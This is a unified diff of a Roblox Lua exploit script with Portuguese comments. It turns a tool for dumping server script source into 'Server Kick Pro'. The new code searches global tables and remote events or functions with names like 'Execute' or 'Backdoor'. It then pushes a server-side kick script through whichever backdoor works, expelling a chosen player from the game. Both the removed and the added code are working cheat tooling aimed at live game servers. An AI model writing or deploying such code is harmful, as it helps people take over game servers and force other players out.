@@ -1,9 +1,8 @@
 --[[
-    🔍 ServerScript Lister Pro – Exposição agressiva de scripts do servidor
-    Interface profissional, arrastável, com lista de scripts, visualizador de código,
-    console de status e botão de cópia.
-    Usa múltiplas técnicas para encontrar TODOS os scripts acessíveis,
-    com foco em ServerScriptService e ServerStorage.
+    👢 Server Kick Pro – Lista jogadores e kicka via backdoors
+    Interface completa, arrastável, com botão de fechar.
+    Escaneia backdoors automaticamente e executa o kick no servidor.
+    O jogador alvo é realmente expulso do servidor para todos.
 --]]
 
 local Players = game:GetService("Players")
@@ -13,14 +12,8 @@ local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local ServerStorage = game:GetService("ServerStorage")
-local ServerScriptService = game:GetService("ServerScriptService")
 local Workspace = game:GetService("Workspace")
 local Lighting = game:GetService("Lighting")
-local StarterGui = game:GetService("StarterGui")
-local StarterPack = game:GetService("StarterPack")
-local StarterPlayer = game:GetService("StarterPlayer")
-local Chat = game:GetService("Chat")
-local SoundService = game:GetService("SoundService")
 
 -- Aguarda personagem
 if not Player.Character then Player.CharacterAdded:Wait() end
@@ -70,7 +63,7 @@ end
 
 -- ==================== INTERFACE ====================
 local gui = Instance.new("ScreenGui")
-gui.Name = "ServerScriptListerPro"
+gui.Name = "ServerKickPro"
 gui.Parent = CoreGui
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.ResetOnSpawn = false
@@ -79,13 +72,13 @@ local Main = Instance.new("Frame")
 Main.Parent = gui
 Main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
 Main.BorderSizePixel = 0
-Main.Size = UDim2.new(0, 650, 0, 480)
-Main.Position = UDim2.new(0.5, -325, 0.5, -240)
+Main.Size = UDim2.new(0, 320, 0, 420)
+Main.Position = UDim2.new(0.5, -160, 0.5, -210)
 Main.ClipsDescendants = true
 Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
-Instance.new("UIStroke", Main).Color = Color3.fromRGB(0, 200, 255)
+Instance.new("UIStroke", Main).Color = Color3.fromRGB(255, 0, 0)
 
--- Barra de título
+-- Título
 local TitleBar = Instance.new("Frame")
 TitleBar.Parent = Main
 TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
@@ -93,8 +86,8 @@ TitleBar.BorderSizePixel = 0
 TitleBar.Size = UDim2.new(1, 0, 0, 40)
 local titleGradient = Instance.new("UIGradient", TitleBar)
 titleGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 200)),
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 0)),
 })
 titleGradient.Rotation = 90
 Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 12)
@@ -111,7 +104,7 @@ TitleText.BackgroundTransparency = 1
 TitleText.Position = UDim2.new(0, 15, 0, 0)
 TitleText.Size = UDim2.new(1, -50, 1, 0)
 TitleText.Font = Enum.Font.GothamBlack
-TitleText.Text = "🔍 ServerScript Lister Pro"
+TitleText.Text = "👢 Server Kick Pro"
 TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
 TitleText.TextSize = 16
 TitleText.TextXAlignment = Enum.TextXAlignment.Left
@@ -127,52 +120,60 @@ CloseBtn.Font = Enum.Font.GothamBlack
 CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseBtn.TextSize = 12
 Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
-CloseBtn.MouseButton1Click:Connect(function() gui:Destroy() Notify("Lister", "Fechado") end)
+CloseBtn.MouseButton1Click:Connect(function() gui:Destroy() Notify("Kick", "Fechado") end)
 
--- Lista de scripts (lado esquerdo)
-local ScriptList = Instance.new("ScrollingFrame")
-ScriptList.Parent = Main
-ScriptList.BackgroundTransparency = 1
-ScriptList.BorderSizePixel = 0
-ScriptList.Position = UDim2.new(0, 10, 0, 50)
-ScriptList.Size = UDim2.new(0, 220, 1, -100)
-ScriptList.ScrollBarThickness = 3
-ScriptList.ScrollBarImageColor3 = Color3.fromRGB(0, 200, 255)
-ScriptList.CanvasSize = UDim2.new(0, 0, 0, 0)
+-- Lista de jogadores
+local PlayerList = Instance.new("ScrollingFrame")
+PlayerList.Parent = Main
+PlayerList.BackgroundTransparency = 1
+PlayerList.BorderSizePixel = 0
+PlayerList.Position = UDim2.new(0, 10, 0, 50)
+PlayerList.Size = UDim2.new(1, -20, 0, 220)
+PlayerList.ScrollBarThickness = 3
+PlayerList.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
+PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
 
-local ScriptListLayout = Instance.new("UIListLayout")
-ScriptListLayout.Parent = ScriptList
-ScriptListLayout.Padding = UDim.new(0, 2)
+local PlayerListLayout = Instance.new("UIListLayout")
+PlayerListLayout.Parent = PlayerList
+PlayerListLayout.Padding = UDim.new(0, 4)
+PlayerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
--- Painel do código (lado direito)
-local CodeViewer = Instance.new("TextBox")
-CodeViewer.Parent = Main
-CodeViewer.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
-CodeViewer.BorderSizePixel = 0
-CodeViewer.Position = UDim2.new(0, 240, 0, 50)
-CodeViewer.Size = UDim2.new(1, -250, 0, 280)
-CodeViewer.Font = Enum.Font.Code
-CodeViewer.Text = "Selecione um script na lista para ver o código."
-CodeViewer.TextColor3 = Color3.fromRGB(180, 180, 200)
-CodeViewer.TextSize = 10
-CodeViewer.ClearTextOnFocus = false
-CodeViewer.TextEditable = false
-CodeViewer.TextWrapped = true
-CodeViewer.TextXAlignment = Enum.TextXAlignment.Left
-CodeViewer.TextYAlignment = Enum.TextYAlignment.Top
-Instance.new("UICorner", CodeViewer).CornerRadius = UDim.new(0, 6)
+-- Botões
+local ScanBtn = Instance.new("TextButton")
+ScanBtn.Parent = Main
+ScanBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
+ScanBtn.BorderSizePixel = 0
+ScanBtn.Position = UDim2.new(0, 10, 0, 276)
+ScanBtn.Size = UDim2.new(1, -20, 0, 30)
+ScanBtn.Text = "🔍 RE-ESCANEAR BACKDOORS"
+ScanBtn.Font = Enum.Font.GothamBlack
+ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScanBtn.TextSize = 11
+Instance.new("UICorner", ScanBtn).CornerRadius = UDim.new(0, 8)
 
--- Console de status (abaixo do código)
+local KickBtn = Instance.new("TextButton")
+KickBtn.Parent = Main
+KickBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+KickBtn.BorderSizePixel = 0
+KickBtn.Position = UDim2.new(0, 10, 0, 310)
+KickBtn.Size = UDim2.new(1, -20, 0, 34)
+KickBtn.Text = "👢 KICKAR JOGADOR SELECIONADO"
+KickBtn.Font = Enum.Font.GothamBlack
+KickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+KickBtn.TextSize = 12
+Instance.new("UICorner", KickBtn).CornerRadius = UDim.new(0, 8)
+
+-- Console
 local Console = Instance.new("TextBox")
 Console.Parent = Main
 Console.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
 Console.BorderSizePixel = 0
-Console.Position = UDim2.new(0, 240, 0, 338)
-Console.Size = UDim2.new(1, -250, 0, 92)
+Console.Position = UDim2.new(0, 10, 0, 350)
+Console.Size = UDim2.new(1, -20, 0, 60)
 Console.Font = Enum.Font.Code
-Console.Text = "Console: Aguardando scan...\n"
-Console.TextColor3 = Color3.fromRGB(150, 150, 160)
-Console.TextSize = 9
+Console.Text = "Console: Escaneie backdoors primeiro.\n"
+Console.TextColor3 = Color3.fromRGB(180, 180, 200)
+Console.TextSize = 10
 Console.ClearTextOnFocus = false
 Console.TextEditable = false
 Console.TextWrapped = true
@@ -184,199 +185,142 @@ local function Log(msg)
     Console.Text = Console.Text .. msg .. "\n"
 end
 
--- Botões de ação
-local RefreshBtn = Instance.new("TextButton")
-RefreshBtn.Parent = Main
-RefreshBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
-RefreshBtn.BorderSizePixel = 0
-RefreshBtn.Position = UDim2.new(0, 10, 1, -45)
-RefreshBtn.Size = UDim2.new(0, 120, 0, 30)
-RefreshBtn.Text = "🔄 RESCANEAR"
-RefreshBtn.Font = Enum.Font.GothamBlack
-RefreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-RefreshBtn.TextSize = 11
-Instance.new("UICorner", RefreshBtn).CornerRadius = UDim.new(0, 6)
+-- ==================== LISTA DE JOGADORES ====================
+local selectedPlayer = nil
+local playerButtons = {}
 
-local CopyBtn = Instance.new("TextButton")
-CopyBtn.Parent = Main
-CopyBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-CopyBtn.BorderSizePixel = 0
-CopyBtn.Position = UDim2.new(1, -130, 1, -45)
-CopyBtn.Size = UDim2.new(0, 120, 0, 30)
-CopyBtn.Text = "📋 COPIAR CÓDIGO"
-CopyBtn.Font = Enum.Font.GothamBlack
-CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-CopyBtn.TextSize = 10
-Instance.new("UICorner", CopyBtn).CornerRadius = UDim.new(0, 6)
-
--- ==================== LISTAGEM DE SCRIPTS ====================
-local discoveredScripts = {}  -- tabela indexada por nome único
-local scriptButtons = {}
-
-local function addScript(prefix, obj, source)
-    local fullName = obj:GetFullName()
-    local key = prefix .. fullName
-    if discoveredScripts[key] then return end
-    discoveredScripts[key] = {name = key, object = obj, source = source}
-    
-    local btn = Instance.new("TextButton")
-    btn.Parent = ScriptList
-    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    btn.BorderSizePixel = 0
-    btn.Size = UDim2.new(1, -4, 0, 26)
-    btn.Text = key
-    btn.Font = Enum.Font.Code
-    btn.TextColor3 = Color3.fromRGB(200, 200, 220)
-    btn.TextSize = 9
-    btn.TextXAlignment = Enum.TextXAlignment.Left
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
-    
-    btn.MouseButton1Click:Connect(function()
-        CodeViewer.Text = source or "Código não disponível."
-        Log("Exibindo: " .. key)
-    end)
-    
-    table.insert(scriptButtons, btn)
+local function refreshPlayerList()
+    for _, btn in ipairs(playerButtons) do btn:Destroy() end
+    playerButtons = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= Player then
+            local btn = Instance.new("TextButton")
+            btn.Parent = PlayerList
+            btn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+            btn.BorderSizePixel = 0
+            btn.Size = UDim2.new(1, -10, 0, 30)
+            btn.Text = p.Name
+            btn.Font = Enum.Font.Gotham
+            btn.TextColor3 = Color3.fromRGB(200, 200, 220)
+            btn.TextSize = 12
+            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+            btn.MouseButton1Click:Connect(function()
+                selectedPlayer = p
+                for _, b in ipairs(playerButtons) do b.BackgroundColor3 = Color3.fromRGB(30, 30, 40) end
+                btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                Log("Selecionado: " .. p.Name)
+            end)
+            table.insert(playerButtons, btn)
+        end
+    end
+    PlayerList.CanvasSize = UDim2.new(0, 0, 0, #playerButtons * 34)
 end
+refreshPlayerList()
+Players.PlayerAdded:Connect(refreshPlayerList)
+Players.PlayerRemoving:Connect(function(p)
+    if p == selectedPlayer then selectedPlayer = nil end
+    task.wait(0.1)
+    refreshPlayerList()
+end)
 
-local function scanAll()
-    -- Limpa
-    discoveredScripts = {}
-    for _, btn in ipairs(scriptButtons) do btn:Destroy() end
-    scriptButtons = {}
+-- ==================== BACKDOORS ====================
+local backdoors = {}
+
+local function scanBackdoors()
+    backdoors = {}
     Console.Text = ""
-    Log("🔍 INICIANDO SCAN AGRESSIVO DE SCRIPTS DO SERVIDOR...")
-    Log("")
+    Log("🔍 Escaneando backdoors...")
 
-    -- Função auxiliar para buscar scripts em um container recursivamente
-    local function searchContainer(container, prefix, depth)
+    -- _G, shared
+    local funcs = {"loadstring", "execute", "run", "eval", "exec", "RunScript", "ServerScript", "require"}
+    for _, fn in ipairs(funcs) do
+        if _G[fn] and type(_G[fn]) == "function" then
+            table.insert(backdoors, {name = "_G." .. fn, func = _G[fn], type = "function"})
+            Log("✅ _G." .. fn)
+        end
+        if shared and shared[fn] and type(shared[fn]) == "function" then
+            table.insert(backdoors, {name = "shared." .. fn, func = shared[fn], type = "function"})
+            Log("✅ shared." .. fn)
+        end
+    end
+
+    -- RemoteEvents/RemoteFunctions suspeitos
+    local suspicious = {"Execute", "Run", "Load", "Eval", "Script", "Server", "Command", "Admin", "Backdoor", "Kick", "Fire", "Invoke", "DoScript", "RunCode", "Exec"}
+    local function search(container, depth)
         if depth > 50 then return end
         for _, obj in ipairs(container:GetChildren()) do
-            if obj:IsA("LuaSourceContainer") then
-                local source = pcall(function() return obj.Source end)
-                addScript(prefix, obj, source and obj.Source or nil)
-            end
-            pcall(function() searchContainer(obj, prefix, depth + 1) end)
-        end
-    end
-
-    -- 1. ServerScriptService (se acessível)
-    Log("📂 Vasculhando ServerScriptService...")
-    searchContainer(ServerScriptService, "[SSS] ", 0)
-
-    -- 2. ServerStorage
-    Log("📂 Vasculhando ServerStorage...")
-    searchContainer(ServerStorage, "[SS] ", 0)
-
-    -- 3. Workspace
-    Log("📂 Vasculhando Workspace...")
-    searchContainer(Workspace, "[WS] ", 0)
-
-    -- 4. ReplicatedStorage
-    Log("📂 Vasculhando ReplicatedStorage...")
-    searchContainer(ReplicatedStorage, "[RS] ", 0)
-
-    -- 5. Lighting
-    Log("📂 Vasculhando Lighting...")
-    searchContainer(Lighting, "[LG] ", 0)
-
-    -- 6. StarterGui, StarterPack, StarterPlayer
-    Log("📂 Vasculhando StarterGui/StarterPack/StarterPlayer...")
-    searchContainer(StarterGui, "[SG] ", 0)
-    searchContainer(StarterPack, "[SP] ", 0)
-    searchContainer(StarterPlayer, "[SPL] ", 0)
-
-    -- 7. Chat
-    Log("📂 Vasculhando Chat...")
-    searchContainer(Chat, "[CH] ", 0)
-
-    -- 8. SoundService
-    Log("📂 Vasculhando SoundService...")
-    searchContainer(SoundService, "[SO] ", 0)
-
-    -- 9. Técnica avançada: getnilinstances (se disponível)
-    local getnilinstances = getnilinstances or (syn and syn.getnilinstances) or (krnl and krnl.getnilinstances) or nil
-    if getnilinstances then
-        Log("📂 Usando getnilinstances...")
-        local nilInstances = getnilinstances()
-        for _, obj in ipairs(nilInstances) do
-            if obj:IsA("LuaSourceContainer") then
-                local source = pcall(function() return obj.Source end)
-                addScript("[NIL] ", obj, source and obj.Source or nil)
-            end
-        end
-    else
-        Log("⚠️ getnilinstances não disponível.")
-    end
-
-    -- 10. Técnica avançada: getsenv (se disponível)
-    local getsenv = getsenv or (syn and syn.getsenv) or (krnl and krnl.getsenv) or nil
-    if getsenv then
-        Log("📂 Usando getsenv...")
-        local env = getsenv()
-        local function scanEnv(t, path)
-            for name, value in pairs(t) do
-                if type(value) == "function" and islclosure and islclosure(value) then
-                    local funcEnv = getfenv(value)
-                    if funcEnv and funcEnv.script and funcEnv.script:IsA("LuaSourceContainer") then
-                        local source = pcall(function() return funcEnv.script.Source end)
-                        addScript("[ENV] ", funcEnv.script, source and funcEnv.script.Source or nil)
+            local lower = obj.Name:lower()
+            for _, n in ipairs(suspicious) do
+                if lower:find(n:lower()) then
+                    if obj:IsA("RemoteEvent") then
+                        table.insert(backdoors, {name = "RE: " .. obj:GetFullName(), remote = obj, type = "RemoteEvent"})
+                        Log("✅ RemoteEvent: " .. obj:GetFullName())
+                    elseif obj:IsA("RemoteFunction") then
+                        table.insert(backdoors, {name = "RF: " .. obj:GetFullName(), remote = obj, type = "RemoteFunction"})
+                        Log("✅ RemoteFunction: " .. obj:GetFullName())
                     end
                 end
             end
-        end
-        scanEnv(env, "Global")
-    else
-        Log("⚠️ getsenv não disponível.")
-    end
-
-    -- 11. Técnica avançada: getloadedmodules (se disponível)
-    local getloadedmodules = getloadedmodules or (syn and syn.getloadedmodules) or nil
-    if getloadedmodules then
-        Log("📂 Usando getloadedmodules...")
-        local modules = getloadedmodules()
-        for _, mod in ipairs(modules) do
-            if mod:IsA("ModuleScript") then
-                local source = pcall(function() return mod.Source end)
-                addScript("[MOD] ", mod, source and mod.Source or nil)
-            end
-        end
-    else
-        Log("⚠️ getloadedmodules não disponível.")
-    end
-
-    -- 12. Procurar em _G referências a scripts
-    Log("📂 Vasculhando _G por scripts...")
-    if _G then
-        for name, value in pairs(_G) do
-            if type(value) == "userdata" and value:IsA("LuaSourceContainer") then
-                local source = pcall(function() return value.Source end)
-                addScript("[_G] ", value, source and value.Source or nil)
-            end
+            pcall(function() search(obj, depth + 1) end)
         end
     end
+    search(Workspace, 0)
+    search(ReplicatedStorage, 0)
+    search(ServerStorage, 0)
+    search(Lighting, 0)
+    if Player.Character then search(Player.Character, 0) end
 
-    -- Atualiza lista
-    ScriptList.CanvasSize = UDim2.new(0, 0, 0, #scriptButtons * 28)
-    Log("")
-    Log("✅ SCAN CONCLUÍDO. " .. #scriptButtons .. " scripts encontrados.")
-    if #scriptButtons == 0 then
-        Log("⚠️ Nenhum script pôde ser lido. O executor pode não ter acesso ao servidor.")
-    else
-        Log("📋 Selecione um script na lista à esquerda para ver o código.")
-    end
+    Log("📊 Backdoors: " .. #backdoors)
+    if #backdoors == 0 then Log("⚠️ Nenhuma backdoor encontrada.") end
 end
 
-RefreshBtn.MouseButton1Click:Connect(scanAll)
+-- ==================== KICK ====================
+local kickScriptTemplate = [[
+local targetName = "TARGET_NAME"
+local Players = game:GetService("Players")
+local target = Players:FindFirstChild(targetName)
+if target then
+    target:Kick("Expulso pelo Server Kick Pro")
+    return "OK"
+end
+return "Jogador não encontrado"
+]]
 
-CopyBtn.MouseButton1Click:Connect(function()
-    local text = CodeViewer.Text
-    if text and text ~= "" then
-        pcall(function()
-            if setclipboard then setclipboard(text)
-            elseif writefile then writefile("script_code.txt", text) end
-        end)
-        Notify("Copiado!", "Código copiado para a área de transferência.")
+local function executeKick(targetPlayer)
+    local code = kickScriptTemplate:gsub("TARGET_NAME", targetPlayer.Name)
+    for _, bd in ipairs(backdoors) do
+        local ok, err
+        if bd.type == "RemoteEvent" then
+            ok, err = pcall(function() bd.remote:FireServer(code) end)
+            if ok then Log("✅ Enviado via " .. bd.name); return true end
+            Log("❌ Falha " .. bd.name .. ": " .. tostring(err))
+        elseif bd.type == "RemoteFunction" then
+            local res
+            ok, res = pcall(function() return bd.remote:InvokeServer(code) end)
+            if ok and res then Log("✅ Executado via " .. bd.name .. " (retorno: " .. tostring(res) .. ")"); return true end
+            Log("❌ Falha " .. bd.name .. ": " .. tostring(res))
+        elseif bd.type == "function" then
+            ok, err = pcall(function() bd.func(code) end)
+            if ok then Log("✅ Executado via " .. bd.name); return true end
+            Log("❌ Falha " .. bd.name .. ": " .. tostring(err))
+        end
+    end
+    return false
+end
+
+-- ==================== EVENTOS ====================
+ScanBtn.MouseButton1Click:Connect(scanBackdoors)
+
+KickBtn.MouseButton1Click:Connect(function()
+    if not selectedPlayer then Log("Selecione um jogador!"); return end
+    if #backdoors == 0 then Log("Nenhuma backdoor. Escaneie primeiro!"); return end
+    Log("👢 Kickando " .. selectedPlayer.Name .. "...")
+    if executeKick(selectedPlayer) then
+        Log("✅ Kick enviado!")
+        Notify("Kick", selectedPlayer.Name .. " foi expulso!", 2)
+    else
+        Log("❌ Falha ao kickar.")
+        Notify("Falha", "Nenhuma backdoor funcionou.")
     end
 end)
 
@@ -414,6 +358,7 @@ UIS.InputEnded:Connect(function(input)
 end)
 
 -- ==================== INICIALIZAÇÃO ====================
-scanAll()
+scanBackdoors()
+task.spawn(function() while gui and gui.Parent do task.wait(5) refreshPlayerList() end end)
 
-Notify("🔍 ServerScript Lister Pro", "Scan concluído. Selecione um script para ver o código.", 5)
+Notify("👢 Server Kick Pro", "Escaneie backdoors e selecione um jogador para kickar!", 5)
